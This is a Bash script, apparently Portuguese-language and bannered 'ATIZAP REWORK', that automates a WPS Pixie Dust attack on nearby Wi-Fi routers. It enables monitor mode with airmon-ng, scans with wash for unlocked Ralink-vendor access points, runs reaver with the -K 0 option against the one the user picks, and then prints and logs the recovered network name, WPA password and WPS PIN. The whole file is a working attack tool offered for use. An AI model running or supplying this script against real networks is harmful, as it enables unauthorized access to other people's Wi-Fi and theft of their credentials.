#!/bin/bash

DIRETORIO=$(dirname "$(readlink -f "$0")")

rm -f $DIRETORIO/Proximo.txt

cor() {
  echo -e "\e[$1m$2\e[0m"
}

carregando() {
  local mensagem="${1:-Carregando}"
  local i=0
  local simbolos=('.  ' '.. ' '...')

  while true; do
    echo -ne "\r$mensagem${simbolos[$i]}"
    i=$(( (i + 1) % 3 ))
    sleep 0.5
  done
}

digitar() {
  local texto="$1"
  local delay="${2:-0.05}"
  local cor="${3:-\e[0m}"  # cor padrão (sem cor)

  echo -ne "$cor"  # aplica cor
  for ((i=0; i<${#texto}; i++)); do
    echo -n "${texto:$i:1}"
    sleep "$delay"
  done
  echo -e "\e[0m"  # reseta cor
}

Tratar_logar(){
    SENHA=$(grep 'WPA PSK:' $DIRETORIO/saida.txt | cut -d ':' -f 2 | sed "s/'//g")
    SSID=$(grep 'AP SSID:' $DIRETORIO/saida.txt | cut -d ':' -f 2 | sed "s/'//g")
    PIN=$(grep 'WPS PIN:' $DIRETORIO/saida.txt | cut -d ':' -f 2 | sed "s/'//g")

    if [[ $SSID == "" && $SENHA == "" && $PIN == "" ]]; then
        exit 1
        echo "FALHA"
    fi

    cor "4;32" "Recuperando informações"
    digitar "Nome do wifi >>$SSID" 0.06 "\e[1;32m"
    digitar "Senha >>$SENHA" 0.06 "\e[1;32m"
    cor "4;36" "Extra"
    digitar "PIN >>$PIN" 0.09 "\e[1;33m"
    digitar "DBM >>$DEBEEME" 0.09 "\e[1;33m"

    echo "$(date '+%Y-%m-%d %H:%M:%S') | SSID=$SSID | SENHA=$SENHA | PIN=$PIN | Força=$DEBEEME" >> $DIRETORIO/logs/atizap.log
}


uashi(){
    timeout 30s sudo wash -F -i $MON > $DIRETORIO/Lavar.txt

    tail -n +3 "$DIRETORIO/Lavar.txt" | while read -r linha; do
        read -r bssid ch dbm wps lck vendor essid <<< "$linha"

        if [[ "$vendor" == "RalinkTe" && "$lck" == "No" && "$dbm" -gt -85 ]]; then
            echo "$bssid $ch $dbm $essid" >> $DIRETORIO/Proximo.txt
            local DEBEEME="$dbm"
        fi
    done
}

EFE(){
    Trator=$(cat $DIRETORIO/Proximo.txt | fzf)
    read -r bssid ch dbm ssid <<< "$(echo "$Trator" | awk '{print $1, $2, $3, substr($0, index($0,$4))}')"

    carregando "\e[1;33mRodando Reaver\e[0m" &
    ANIM_PID=$!
    timeout 15s sudo reaver -i $MON --bssid "$bssid" -c "$ch" -K 0 2> $DIRETORIO/saida.txt
    kill "$ANIM_PID" &> /dev/null
    wait "$ANIM_PID" 2>/dev/null
}


MONI(){
    sudo airmon-ng start $escolhida > /dev/null
    MON=$(ip link show | grep -oP '^\d+: \K(wl\w+)' | grep -i 'mon')
    cor "4;31" "$MON <<< ATIVADA"
}

interfaces=($(ip link show | grep -oP '^\d+: \K(wl\w+)'))

clear
cor 32 "
  ╔═╗┌┬┐┬┌─┐┌─┐┌─┐
  ╠═╣ │ │┌─┘├─┤├─┘
  ╩ ╩ ┴ ┴└─┘┴ ┴┴
╦═╗┌─┐┬ ┬┌─┐┬─┐┬┌─
╠╦╝├┤ ││││ │├┬┘├┴┐
╩╚═└─┘└┴┘└─┘┴└─┴ ┴
"
escolhida=$(printf "%s\n" "${interfaces[@]}" | fzf --prompt="Alterar Placa: ")

digitar "Placa atual >> $escolhida" 0.09 "\e[35m"

carregando "\e[1;33mInicio Airmon-ng\e[0m" &
ANIM_PID=$!
MONI
kill "$ANIM_PID" &> /dev/null
wait "$ANIM_PID" 2>/dev/null

carregando "\e[1;33mInicio Wash\e[0m" &
ANIM_PID=$!
uashi
kill "$ANIM_PID" &> /dev/null
wait "$ANIM_PID" 2>/dev/null
cor "4;36" "Concluido"

cor "33" "Inicio do Reaver \n"

EFE

Tratar_logar
